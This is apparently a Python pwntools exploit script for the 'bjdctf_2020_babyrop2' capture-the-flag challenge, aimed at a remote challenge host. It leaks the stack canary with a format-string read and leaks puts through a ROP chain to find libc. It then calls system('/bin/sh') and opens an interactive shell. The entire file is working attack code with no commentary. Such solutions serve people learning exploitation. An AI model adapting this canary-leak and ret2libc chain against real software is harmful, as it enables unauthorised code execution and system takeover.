#Made by fly_autumn
#x64 fmt+ret2libc
from pwn import *
#p = process("./bjdctf_2020_babyrop2")
p = remote("node5.buuoj.cn",26684)
elf = ELF("./bjdctf_2020_babyrop2")
context(os="linux",arch="amd64")
libc = ELF("./libc.so.6")

offset = 24
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
pop_rdi = 0x400993
ret = 0x4005f9
vuln_plt = 0x400887

payload1 = b"%7$p"
p.recvuntil(b"u!\n")
p.sendline(payload1)
canary = int(p.recvline(),16)
log.success("canary : "+hex(canary))
p.recvuntil(b"story!\n")
payload2 = b"\x00" * offset + p64(canary) + p64(ret) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_plt)
p.send(payload2)

puts_addr = u64(p.recv(6).ljust(8,b"\0"))
log.success("puts addr: "+hex(puts_addr))
libc_addr = puts_addr - libc.sym["puts"]
log.success("libc addr: "+hex(libc_addr))
sys_addr = libc_addr + libc.sym["system"]
log.success("sys addr: "+hex(sys_addr))
sh_addr = libc_addr + next(libc.search("/bin/sh"))
log.success("sh addr: "+hex(sh_addr))

p.recvuntil(b"story!\n")
payload3 = b"\x00" * offset + p64(canary) + p64(ret) + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)
p.sendline(payload3)

p.interactive()
